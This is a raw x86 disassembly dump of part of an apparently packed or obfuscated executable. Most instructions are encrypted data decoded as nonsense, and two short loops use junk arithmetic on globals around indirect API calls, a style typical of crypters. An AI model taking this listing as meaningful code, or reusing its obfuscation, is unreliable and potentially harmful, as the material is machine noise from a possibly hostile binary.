  412023:	outs   dx,DWORD PTR ds:[esi]
  412024:	mov    esp,0xe0fe6e7a
  412029:	scas   eax,DWORD PTR es:[edi]
  41202a:	call   0x5c28ffab
  41202f:	retf   
  412030:	shr    BYTE PTR [edi],cl
  412032:	pop    ss
  412033:	cwde   
  412034:	pop    esp
  412035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412036:	xor    BYTE PTR [edx],dl
  412038:	sub    BYTE PTR [ebx-0x15],dh
  41203b:	or     al,0x42
  41203d:	sahf   
  41203e:	fwait
  41203f:	xchg   esi,eax
  412040:	(bad)  
  412041:	mov    bh,0xe5
  412043:	pop    edx
  412044:	add    DWORD PTR [eax+ebx*1],0xf6539c97
  41204b:	and    eax,0x5ec5c5f8
  412050:	jbe    0x411feb
  412052:	adc    dl,BYTE PTR [esi-0x5021fd7f]
  412058:	xor    dl,BYTE PTR [edx+0x1249b02c]
  41205e:	inc    ebx
  41205f:	jle    0x412053
  412061:	in     al,dx
  412062:	jns    0x4120ab
  412064:	sar    ebp,cl
  412066:	retf   
  412067:	lock add ebx,DWORD PTR fs:[ebx-0x72a0f0]
  41206f:	enter  0x9cf4,0xf9
  412073:	in     al,dx
  412074:	cdq    
  412075:	add    BYTE PTR [ecx+0x4e],dh
  412078:	pop    ebx
  412079:	xor    edx,DWORD PTR [ebx-0x6]
  41207c:	je     0x412023
  41207e:	sbb    eax,0xba3a4a84
  412083:	mov    dl,BYTE PTR [edi-0x5c]
  412086:	mov    eax,0x4e3912c7
  41208b:	iret   
  41208c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41208d:	sbb    ebp,DWORD PTR [esp+ecx*1]
  412090:	mov    eax,0x335dc35e
  412095:	pusha  
  412096:	sbb    al,BYTE PTR [ecx]
  412098:	jne    0x4120cf
  41209a:	mov    dl,0x20
  41209c:	fadd   DWORD PTR ss:[edi+eax*2-0x2c]
  4120a1:	inc    eax
  4120a2:	xchg   ecx,eax
  4120a3:	or     dl,ch
  4120a5:	test   eax,0x8b1ef989
  4120aa:	inc    ebp
  4120ab:	or     BYTE PTR [ebx+0x240d8b00],cl
  4120b1:	mov    dl,0x41
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	pop    ss
  41216e:	iret   
  41216f:	je     0x412116
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x7170707e
  41217a:	jecxz  0x412181
  41217c:	xor    ch,BYTE PTR [esi]
  41217e:	cmp    edx,DWORD PTR [ecx+esi*4-0x64]
  412182:	call   0x9bb30afb
  412187:	div    DWORD PTR [eax-0x64867193]
  41218d:	mov    dl,0x87
  41218f:	push   0xa55b6bd
  412194:	cdq    
  412195:	hlt    
  412196:	mov    BYTE PTR [eax+0x1778f7e3],dh
  41219c:	jno    0x412205
  41219e:	pop    edx
  41219f:	call   0xf4b1:0xe7cda0
  4121a6:	mov    ecx,0x53dba40d
  4121ab:	jnp    0x412163
  4121ad:	mov    al,0xe1
  4121af:	cmp    DWORD PTR [esi-0x55],esp
  4121b2:	and    eax,0xd78728b5
  4121b7:	loopne 0x412214
  4121b9:	pop    ebx
  4121ba:	mov    gs,WORD PTR [ebx]
  4121bc:	xor    BYTE PTR [eax-0x3f],ah
  4121bf:	push   edi
  4121c0:	sub    bh,BYTE PTR [eax]
  4121c2:	sub    eax,DWORD PTR [edi]
  4121c4:	dec    esp
  4121c5:	stos   DWORD PTR es:[edi],eax
  4121c6:	stc    
  4121c7:	into   
  4121c8:	jo     0x412233
  4121ca:	shr    BYTE PTR [ecx-0x62],1
  4121cd:	scas   eax,DWORD PTR es:[edi]
  4121ce:	sbb    eax,0xc0bec5a8
  4121d3:	add    al,0xf3
  4121d5:	shr    DWORD PTR [edx],cl
  4121d7:	out    dx,al
  4121d8:	shl    BYTE PTR [esi-0x1a5e6f5b],1
  4121de:	in     al,dx
  4121df:	mov    ah,0xca
  4121e1:	mov    cs,WORD PTR [ebx+eiz*2-0x7]
  4121e5:	inc    esi
  4121e6:	and    dh,bh
  4121e8:	sub    bl,BYTE PTR [ecx+0x6f456db3]
  4121ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ef:	loope  0x412258
  4121f1:	and    esi,DWORD PTR [esi+0x1d]
  4121f4:	out    0x77,eax
  4121f6:	xor    esp,eax
  4121f8:	mov    dh,0xb8
  4121fa:	push   ss
  4121fb:	shl    DWORD PTR [edx+eax*8+0x44d4fb9e],cl
  412202:	sti    
  412203:	mov    ds:0xc64b4ce4,al
  412208:	sub    al,0x2f
  41220a:	fmul   QWORD PTR [ebp+0x7f]
  41220d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41220e:	aas    
  41220f:	(bad)  
  412211:	adc    BYTE PTR [edi+eax*4+0x25],ch
  412215:	scas   eax,DWORD PTR es:[edi]
  412216:	adc    edi,DWORD PTR [ecx+0x6011f149]
  41221c:	into   
  41221d:	mov    al,ds:0x49713a76
  412222:	mov    al,ds:0x3ff2b959
  412227:	mov    eax,0x7a86f857
  41222c:	fnsave [ebp-0x47429683]
  412232:	push   0x1b
  412234:	(bad)  
  412235:	ja     0x4121dc
  412237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412238:	xor    al,0x23
  41223a:	arpl   bp,cx
  41223c:	scas   eax,DWORD PTR es:[edi]
  41223d:	pop    esp
  41223e:	fst    DWORD PTR [esi]
  412240:	pop    ecx
  412241:	sub    esp,DWORD PTR [ebp+0x54a396e5]
  412247:	fcom   DWORD PTR [ebp+esi*2+0x68a9888a]
  41224e:	jp     0x412228
  412250:	imul   esi,DWORD PTR [ebx+edi*4],0xcc42e58f
  412257:	(bad)  
  412258:	out    dx,al
  412259:	inc    ebp
  41225a:	fs out 0x14,al
  41225d:	push   ecx
  41225e:	fldenv [ebp-0x6f]
  412261:	(bad)  
  412262:	lahf   
  412263:	leave  
  412264:	adc    ah,0x4e
  412267:	xchg   esi,ebp
  412269:	sub    esi,DWORD PTR [eax-0xad08103]
  41226f:	push   cs
  412270:	in     al,dx
  412271:	sub    dh,cl
  412273:	xor    BYTE PTR [edi],bl
  412275:	jmp    0x41226a
  412277:	cmp    DWORD PTR cs:[ecx],ebp
  41227a:	pop    ecx
  41227b:	dec    eax
  41227c:	xchg   DWORD PTR [esi+0x3ce7a387],edi
  412282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412283:	or     eax,0x9defd217
  412288:	push   ecx
  412289:	je     0x41230a
  41228b:	mov    WORD PTR [esi-0x5c67826a],fs
  412291:	psrlw  mm0,mm4
  412294:	les    ebx,FWORD PTR [edx+0x605a2d49]
  41229a:	out    0xd2,al
  41229c:	mov    WORD PTR [ebx+0x1d53214],?
  4122a2:	or     DWORD PTR [ecx-0x53],ebp
  4122a5:	arpl   WORD PTR [eax+0x6f],ax
  4122a8:	mov    al,ds:0xf3291f39
  4122ad:	out    dx,al
  4122ae:	les    edi,FWORD PTR [ebx-0x35afba6d]
  4122b4:	push   edi
  4122b5:	or     al,0x20
  4122b7:	push   esi
  4122b8:	daa    
  4122b9:	mov    ch,0x52
  4122bb:	push   ebp
  4122bc:	pop    eax
  4122bd:	xchg   esi,eax
  4122be:	out    dx,al
  4122bf:	push   edi
  4122c0:	cmc    
  4122c1:	push   esp
  4122c2:	aas    
  4122c3:	and    dh,dh
  4122c5:	out    0xa,eax
  4122c7:	(bad)  
  4122c8:	shr    ebx,1
  4122ca:	adc    dh,dl
  4122cc:	loopne 0x412346
  4122ce:	dec    edi
  4122cf:	sbb    BYTE PTR [esi+eax*1+0x4d27c81c],0x15
  4122d7:	(bad)  
  4122d8:	leave  
  4122d9:	add    al,0x7d
  4122db:	and    edi,DWORD PTR [ecx+0x781c56d]
  4122e1:	dec    ebp
  4122e2:	mov    ecx,0xe0a866e1
  4122e7:	jmp    0x4122e1
  4122e9:	and    ah,BYTE PTR [ebx-0x76ab14c0]
  4122ef:	or     al,0xdc
  4122f1:	pop    edx
  4122f2:	sbb    ecx,ecx
  4122f4:	add    dh,BYTE PTR [ebp+0x4595d6e2]
  4122fa:	shl    DWORD PTR [ecx-0x537ce912],0xb8
  412301:	xor    ebp,DWORD PTR [esi]
  412303:	dec    esi
  412304:	pop    ds
  412305:	or     al,0x65
  412307:	cwde   
  412308:	(bad)  
  412309:	sbb    BYTE PTR [edx],bl
  41230b:	push   0xffffffc9
  41230d:	addr16 dec ecx
  41230f:	lods   al,BYTE PTR ds:[esi]
  412310:	js     0x412371
  412312:	push   esi
  412313:	jmp    0x2ed3:0x706190ea
  41231a:	fucom  st(0)
  41231c:	sub    DWORD PTR ds:0xad561ed4,ebp
  412322:	sbb    bl,BYTE PTR [esi+0x5d]
  412325:	test   al,0xfb
  412327:	sbb    BYTE PTR [ecx-0x2431d47e],0x9
  41232e:	and    ebp,DWORD PTR [esi+0x4a5d6e52]
  412334:	mov    ebp,0x9dea7575
  412339:	and    BYTE PTR ds:0x98ff7ee8,al
  41233f:	icebp  
  412340:	imul   BYTE PTR [ecx+0x35]
  412343:	push   0xffffffd4
  412345:	cli    
  412346:	stos   BYTE PTR es:[edi],al
  412347:	inc    ebp
  412348:	stc    
  412349:	sub    eax,0xe34f5355
  41234e:	iret   
  41234f:	mov    BYTE PTR [ebp-0x61632911],0x23
  412356:	dec    edx
  412357:	sbb    esi,esp
  412359:	loopne 0x4123d4
  41235b:	add    al,0x6b
  41235d:	iret   
  41235e:	inc    esp
  41235f:	outs   dx,BYTE PTR gs:[esi]
  412361:	popf   
  412362:	fisttp QWORD PTR [ecx+0x26b6b37d]
  412368:	nop
  412369:	stc    
  41236a:	jp     0x4123bc
  41236c:	jmp    0xd1ca:0xe6248e4f
  412373:	pop    edi
  412374:	sbb    DWORD PTR [esp+eiz*2],edx
  412377:	aad    0x6b
  412379:	mov    cl,0x1a
  41237b:	add    ch,BYTE PTR [esi]
  41237d:	mov    dh,0xca
  41237f:	loopne 0x412327
  412381:	pushf  
  412382:	add    al,0xe2
  412384:	jae    0x4123ba
  412386:	inc    edx
  412387:	repnz fimul DWORD PTR [eax+0x44]
  41238b:	lods   al,BYTE PTR ds:[esi]
  41238c:	xchg   ebx,eax
  41238d:	push   0x23773f5c
  412392:	sbb    al,0x70
  412394:	push   eax
  412395:	rol    BYTE PTR [ebp-0x59e3267a],1
  41239b:	jns    0x41234f
  41239d:	mov    DWORD PTR [eax-0x62],edx
  4123a0:	sar    BYTE PTR [edi+0x5d10847e],0x79
  4123a7:	cdq    
  4123a8:	xchg   BYTE PTR [ecx-0x20],bh
  4123ab:	rol    BYTE PTR [edx-0x29],0xbb
  4123af:	add    dh,BYTE PTR [ebx+0x48f338a4]
  4123b5:	lds    ebp,FWORD PTR [esi-0x54]
  4123b8:	sbb    edi,DWORD PTR [ebx]
  4123ba:	mov    ebp,0xbec91f0c
  4123bf:	imul   ebx,DWORD PTR [ebx-0x55],0xbe00d4e4
  4123c6:	mov    ecx,0x46a4914f
  4123cb:	mov    ch,0xf4
  4123cd:	cmp    edx,DWORD PTR [ebx]
  4123cf:	cmp    BYTE PTR [edx+0x345c23c0],dh
  4123d5:	mov    bh,0x6
  4123d7:	mov    ds:0xc0c44fd1,al
  4123dc:	int    0x5b
  4123de:	nop
  4123df:	pop    edx
  4123e0:	fnstcw WORD PTR ds:0x3bae8ced
  4123e6:	fiadd  DWORD PTR [esi-0x2da1ce63]
  4123ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ed:	mov    dh,0xe5
  4123ef:	addr16 repz sbb ah,0x2c
  4123f4:	(bad)  
  4123f5:	and    eax,0xf6eb2028
  4123fa:	(bad)  
  4123fb:	push   cs
  4123fc:	adc    DWORD PTR [esi],esp
  4123fe:	stos   DWORD PTR es:[edi],eax
  4123ff:	dec    esi
  412400:	cli    
  412401:	sti    
  412402:	pusha  
  412403:	sti    
  412404:	inc    esi
  412405:	inc    esp
  412406:	arpl   WORD PTR [edi],si
  412408:	sub    DWORD PTR [edx-0x6],0xddeed6b8
  41240f:	jbe    0x412418
  412411:	push   0xdd454d8
  412416:	repnz ss cwde 
  412419:	(bad)  
  41241a:	mov    ebp,0x5854e08b
  41241f:	dec    edi
  412420:	or     eax,0xca0f1442
  412425:	adc    eax,edx
  412427:	les    esp,FWORD PTR cs:[edx-0x11697e55]
  41242e:	or     ebp,DWORD PTR [edx-0x8c407b6]
  412434:	add    al,0xe
  412436:	jo     0x41241e
  412438:	pop    esi
  412439:	icebp  
  41243a:	mov    al,0x87
  41243c:	aad    0x97
  41243e:	mov    ebx,0x81cb0382
  412443:	sub    eax,0x42fcf9
  412448:	xchg   esi,eax
  412449:	sldt   WORD PTR [eax]
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245e:	mov    edx,0x5c8f566d
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xc670707e
  41246a:	mov    cs:0x58d00d21,al
  412470:	jge    0x4124b3
  412472:	add    esp,edi
  412474:	jae    0x41240a
  412476:	jmp    0x406d:0x94295536
  41247d:	dec    esp
  41247e:	fdivr  DWORD PTR [ebx]
  412480:	std    
  412481:	pop    ds
  412482:	jno    0x4124af
  412484:	inc    edi
  412485:	push   eax
  412486:	cld    
  412487:	cmp    BYTE PTR [ecx-0x6a],al
  41248a:	and    BYTE PTR [esi-0x21a624c],0x11
  412491:	sub    ebx,DWORD PTR [ebx+0x67]
  412494:	push   ebx
  412495:	mov    ecx,0x739b7bf7
  41249a:	fild   DWORD PTR [esi+0x32]
  41249d:	arpl   cx,bp
  41249f:	pop    ebx
  4124a0:	xlat   BYTE PTR ds:[ebx]
  4124a1:	jnp    0x4124fa
  4124a3:	mov    al,0x5b
  4124a5:	paddsw mm6,mm7
  4124a8:	mov    ds,WORD PTR [edx-0x1d]
  4124ab:	mov    esp,0xccdc5a84
  4124b0:	fild   QWORD PTR [edx-0x2d2ca040]
  4124b6:	xchg   DWORD PTR ds:0xb9220903,esi
  4124bc:	sbb    al,0x56
  4124be:	adc    al,0xb4
  4124c0:	pushf  
  4124c1:	mov    al,0x68
  4124c3:	xchg   ebp,eax
  4124c4:	div    BYTE PTR [ebx-0x1e3376f7]
  4124ca:	cwde   
  4124cb:	jmp    0x4124c5
  4124cd:	pop    ebp
  4124ce:	aaa    
  4124cf:	add    esp,DWORD PTR [edi]
  4124d1:	shl    eax,0x2b
  4124d4:	push   eax
  4124d5:	push   edx
  4124d6:	jbe    0x4124ff
  4124d8:	inc    ebp
  4124d9:	loop   0x412543
  4124db:	or     eax,0xc6cc18a9
  4124e0:	cld    
  4124e1:	jae    0x4124a3
  4124e3:	mov    al,0x5f
  4124e5:	pushf  
  4124e6:	lock push es
  4124e8:	jp     0x412541
  4124ea:	loop   0x4124d5
  4124ec:	in     al,0xe6
  4124ee:	bound  edx,QWORD PTR [edx]
  4124f0:	popa   
  4124f1:	push   0x9bc364a
  4124f6:	mov    eax,0x39f127cb
  4124fb:	xor    cl,BYTE PTR [eax]
  4124fd:	rcr    BYTE PTR [edx-0x31501892],0x51
  412504:	dec    edx
  412505:	rol    esp,cl
  412507:	dec    ebp
  412508:	loope  0x412564
  41250a:	int3   
  41250b:	dec    ebx
  41250c:	sbb    eax,0x6a7edc2
  412511:	mov    WORD PTR [esi],es
  412513:	xchg   edi,eax
  412514:	fwait
  412515:	push   edi
  412516:	call   0x268b58a5
  41251b:	sbb    dh,BYTE PTR [ebx-0x61]
  41251e:	inc    edi
  41251f:	addr16 loopne 0x412579
  412522:	cld    
  412523:	pop    esi
  412524:	jbe    0x41251b
  412526:	jae    0x4124e7
  412528:	xchg   esp,eax
  412529:	sbb    al,0xea
  41252b:	xchg   esp,eax
  41252c:	mov    WORD PTR [eax-0x519fdef5],ds
  412532:	push   cs
  412533:	into   
  412534:	dec    esp
  412535:	dec    edx
  412536:	cmp    edi,DWORD PTR [ebp-0x536210e5]
  41253c:	jne    0x412528
  41253e:	retf   
  41253f:	pop    esi
  412540:	(bad)  
  412541:	js     0x4124cb
  412543:	and    DWORD PTR [eax-0x4a],ebp
  412546:	mov    esp,0xf9a53abb
  41254b:	shl    BYTE PTR ds:0xdca69f,cl
  412551:	cmp    ecx,ebx
  412553:	pop    edx
  412554:	in     al,0xf1
  412556:	pop    esi
  412557:	gs xchg ebp,eax
  412559:	sbb    DWORD PTR [ebx],0x54
  41255c:	and    al,bh
  41255e:	mov    cl,0x2b
  412560:	sub    al,0x50
  412562:	mov    ebx,0xa15a82e
  412567:	das    
  412568:	es jmp 0xaf9a3acd
  41256e:	mov    ah,BYTE PTR [ebp-0x12]
  412571:	loop   0x4124ff
  412573:	lock gs jl 0x4125be
  412577:	inc    ecx
  412578:	outs   dx,DWORD PTR ds:[esi]
  412579:	sub    ch,ch
  41257b:	das    
  41257c:	push   esp
  41257d:	xlat   BYTE PTR gs:[ebx]
  41257f:	int3   
  412580:	jmp    0x412576
  412582:	mov    eax,ds:0x23d78082
  412587:	add    BYTE PTR [edx-0x2e],dl
  41258a:	call   0x2b7e6b32
  41258f:	sbb    edi,DWORD PTR [edi-0x10]
  412592:	inc    ebx
  412593:	aas    
  412594:	ss ins BYTE PTR es:[edi],dx
  412596:	push   esi
  412597:	mov    eax,DWORD PTR [ebx-0x2512b39c]
  41259d:	lock pop edi
  41259f:	sub    eax,0xea9480fc
  4125a5:	sbb    DWORD PTR [ebp-0x45],esi
  4125a8:	loopne 0x41259a
  4125aa:	(bad)  
  4125ab:	aad    0xf4
  4125ad:	push   ebx
  4125ae:	inc    ebx
  4125af:	sbb    eax,0xf07b5039
  4125b4:	jnp    0x41257c
  4125b6:	(bad)  
  4125b7:	idiv   DWORD PTR [edi+0x42]
  4125ba:	jmp    0x360c80d4
  4125bf:	ss adc al,0x62
  4125c2:	sbb    eax,0x17b3be3
  4125c7:	mov    WORD PTR [ecx],ds
  4125c9:	xchg   edi,eax
  4125ca:	or     dh,cl
  4125cc:	mov    eax,0x601f76f1
  4125d1:	mov    bl,0xda
  4125d3:	adc    BYTE PTR [edx],bh
  4125d5:	mov    ch,0xf3
  4125d7:	xchg   edx,eax
  4125d8:	(bad)  
  4125d9:	cdq    
  4125da:	add    DWORD PTR [ebp-0x4c],0x2f53e7c9
  4125e1:	mov    ecx,0x82c17244
  4125e6:	inc    esi
  4125e7:	(bad)  [ebx+0x27355bc7]
  4125ed:	xchg   BYTE PTR [ecx-0x18],ch
  4125f0:	mov    ch,0x4f
  4125f2:	retf   0xfee2
  4125f5:	iret   
  4125f6:	adc    eax,0x52291ba2
  4125fb:	pop    ecx
  4125fc:	adc    BYTE PTR ds:0xb57c663d,0xc8
  412603:	pushf  
  412604:	inc    ecx
  412605:	mov    edx,0x54ef4255
  41260a:	add    eax,DWORD PTR [ebx-0x7]
  41260d:	lds    eax,FWORD PTR [esi-0x212dd422]
  412613:	mov    DWORD PTR [ecx+0x54],edx
  412616:	xor    edx,DWORD PTR [esi-0x74]
  412619:	aas    
  41261a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41261b:	retf   0x47f9
  41261e:	push   ds
  41261f:	and    dl,BYTE PTR [ecx+ebx*8-0x7b2ca474]
  412626:	pop    eax
  412627:	push   0x3d
  412629:	(bad)  
  41262a:	sub    DWORD PTR [esi+0x6d],edi
  41262d:	mov    edi,DWORD PTR [esi+0x28]
  412630:	xchg   ebp,eax
  412631:	pusha  
  412632:	pop    ecx
  412633:	sub    DWORD PTR [ebx],ebp
  412635:	pop    ebx
  412636:	sahf   
  412637:	inc    ebx
  412638:	cmp    eax,0xb6565d01
  41263d:	mov    ?,WORD PTR [esi+eax*8+0x78]
  412641:	inc    esp
  412642:	cmp    DWORD PTR [eax-0x53],esp
  412645:	aaa    
  412646:	mov    esp,0xb023d61b
  41264b:	xchg   esi,eax
  41264d:	xor    ecx,esi
  41264f:	pop    eax
  412650:	fs ds inc esi
  412653:	xlat   BYTE PTR ds:[ebx]
  412654:	mov    esp,0xf030f6a6
  412659:	loopne 0x4126d6
  41265b:	(bad)  
  41265c:	out    dx,eax
  41265d:	call   0x2bb2:0xfc97b34f
  412664:	mov    bl,0xd3
  412666:	(bad)  
  412667:	or     eax,0xef92491b
  41266c:	cmp    BYTE PTR [eax+eax*8+0x27],cl
  412670:	cdq    
  412671:	and    ebx,0x2341b5fe
  412677:	nop
  412678:	fcom   DWORD PTR [ebx+eax*4]
  41267b:	aad    0xda
  41267d:	leave  
  41267e:	dec    edx
  41267f:	adc    BYTE PTR [edx-0x54c7d616],ch
  412685:	retf   0x4023
  412688:	arpl   WORD PTR [ecx-0x630a7d23],si
  41268e:	rol    DWORD PTR [edi],0x59
  412691:	mov    ch,0xbf
  412693:	ror    BYTE PTR [ecx],cl
  412695:	add    DWORD PTR [edi],eax
  412697:	inc    esi
  412698:	hlt    
  412699:	ins    BYTE PTR es:[edi],dx
  41269a:	fisttp DWORD PTR [eax]
  41269c:	out    dx,eax
  41269d:	retf   
  41269e:	arpl   dx,di
  4126a0:	loopne 0x4126c7
  4126a2:	xor    edi,DWORD PTR [edi-0xe0304fa]
  4126a8:	gs mov dl,0x3a
  4126ab:	(bad)  
  4126ac:	mov    bh,0x1f
  4126ae:	ret    
  4126af:	addr16 std 
  4126b1:	adc    cl,ch
  4126b3:	rcl    esi,cl
  4126b5:	pop    ebp
  4126b6:	setge  BYTE PTR [edi-0x5]
  4126ba:	out    dx,al
  4126bb:	imul   ecx,DWORD PTR [esi+0x5d],0xc7d3c7b8
  4126c2:	rep lods al,BYTE PTR ds:[esi]
  4126c4:	loopne 0x4126ad
  4126c6:	push   ecx
  4126c7:	lods   al,BYTE PTR ds:[esi]
  4126c8:	sbb    cl,BYTE PTR [ebx+ebx*2+0x29]
  4126cc:	out    0xcf,al
  4126ce:	sbb    al,0xb4
  4126d0:	xchg   edx,eax
  4126d1:	add    al,0x95
  4126d3:	call   0xcb92:0xb385e65
  4126da:	mov    esp,0xe7b6114c
  4126df:	xor    dl,ch
  4126e1:	imul   BYTE PTR [edi+0x28]
  4126e4:	jo     0x412762
  4126e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126e7:	mov    ebx,0x8fc416f9
  4126ec:	sub    eax,0x4782842d
  4126f1:	push   0xffffffa3
  4126f3:	xor    al,0x6d
  4126f5:	inc    eax
  4126f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126f7:	jecxz  0x41274d
  4126f9:	pop    eax
  4126fa:	add    bh,dl
  4126fc:	push   esp
  4126fd:	cld    
  4126fe:	in     al,dx
  4126ff:	dec    edx
  412700:	(bad)  
  412701:	aam    0x45
  412703:	test   al,0xfd
  412705:	clc    
  412706:	xchg   edx,eax
  412707:	dec    esp
  412708:	dec    ebp
  412709:	xor    bl,BYTE PTR [edi+0x7d499a28]
  41270f:	mov    esp,0x5a0adefb
  412714:	mov    cl,0x67
  412716:	jmp    0xc15ffcec
  41271b:	imul   ebx,DWORD PTR [edi],0x1f
  41271e:	scas   eax,DWORD PTR es:[edi]
  41271f:	fisttp WORD PTR [ebx+0x3a]
  412722:	push   esp
  412723:	pop    eax
  412724:	add    edi,DWORD PTR [edi+0x47d655de]
  41272a:	xchg   ebp,eax
  41272b:	cld    
  41272c:	push   esp
  41272d:	rcr    DWORD PTR [edi],1
  41272f:	cdq    
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edx,edi
  4127be:	cdq    
  4127bf:	adc    BYTE PTR [edi+0x707059c8],ah
  4127c5:	mov    ecx,0x9970707e
  4127ca:	in     al,0xb6
  4127cc:	jne    0x41276e
  4127ce:	jns    0x41283e
  4127d0:	adc    ah,BYTE PTR [edi+ebp*8]
  4127d3:	popa   
  4127d4:	push   0xffffffee
  4127d6:	xor    BYTE PTR [edx-0x25],bh
  4127d9:	xor    eax,0xa37b6037
  4127de:	sub    dl,BYTE PTR [eax+0x7cab6bf7]
  4127e4:	imul   edi,DWORD PTR [edi],0xb8c8080
  4127ea:	(bad)  
  4127eb:	stc    
  4127ec:	push   0xef3c6b9
  4127f1:	push   0xc850a75a
  4127f6:	out    0xa3,al
  4127f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127f9:	and    al,0x53
  4127fb:	lods   al,BYTE PTR ds:[esi]
  4127fc:	loope  0x412809
  4127fe:	out    0x14,eax
  412800:	nop
  412801:	leave  
  412802:	inc    ecx
  412803:	mov    ebp,0xf1b8b1e0
  412808:	mov    edx,0xf595b885
  41280d:	aas    
  41280e:	fst    st(2)
  412810:	adc    DWORD PTR [ebp-0x71c78b9d],0xfffffff1
  412817:	xor    ebx,DWORD PTR [ecx-0x65]
  41281a:	loopne 0x41288c
  41281c:	cmp    DWORD PTR [ebp-0x6ba73750],0x5
  412823:	data16 icebp 
  412825:	adc    eax,0xd038f73c
  41282a:	push   ecx
  41282b:	mov    WORD PTR [ebp+0xe],?
  41282e:	add    al,0x19
  412830:	jns    0x412828
  412832:	inc    eax
  412833:	mov    esp,0x8d8d165e
  412838:	aas    
  412839:	std    
  41283a:	ja     0x412806
  41283c:	mov    ebp,0x4cf48dd
  412841:	mov    DWORD PTR [ebp+0x5274de55],0xfe49831a
  41284b:	sbb    bh,ah
  41284d:	dec    edx
  41284e:	fadd   st,st(6)
  412850:	ret    
  412851:	adc    bh,ah
  412853:	pop    esp
  412854:	out    dx,eax
  412855:	jmp    0x40a:0xd28adf21
  41285c:	lahf   
  41285d:	pop    eax
  41285e:	cmp    esp,ebx
  412860:	or     cl,dh
  412862:	sahf   
  412863:	mov    esi,0x54a6ce08
  412868:	idiv   al
  41286a:	adc    eax,0x5b
  41286d:	pushf  
  41286e:	lea    eax,[edi]
  412870:	mov    ecx,0xcff61803
  412875:	rcr    dl,cl
  412877:	pushf  
  412878:	mov    al,ds:0xf563c63c
  41287d:	retf   0xf6ac
  412880:	ret    0x8333
  412883:	nop
  412884:	into   
  412885:	jne    0x41287b
  412887:	sbb    esp,edx
  412889:	push   0xfffffffb
  41288b:	xchg   dh,dh
  41288d:	ret    0x39fc
  412890:	in     eax,dx
  412891:	js     0x4128c5
  412893:	adc    BYTE PTR [ecx],ch
  412895:	mov    BYTE PTR [edx-0x2e1d95d0],dh
  41289b:	and    esp,DWORD PTR [ebx]
  41289d:	aad    0x63
  41289f:	iret   
  4128a0:	stos   DWORD PTR es:[edi],eax
  4128a1:	mov    edi,0x638335af
  4128a6:	(bad)  
  4128a8:	fbld   TBYTE PTR [esi]
  4128aa:	push   ebx
  4128ab:	mov    ?,WORD PTR [edi]
  4128ad:	stos   DWORD PTR es:[edi],eax
  4128ae:	cli    
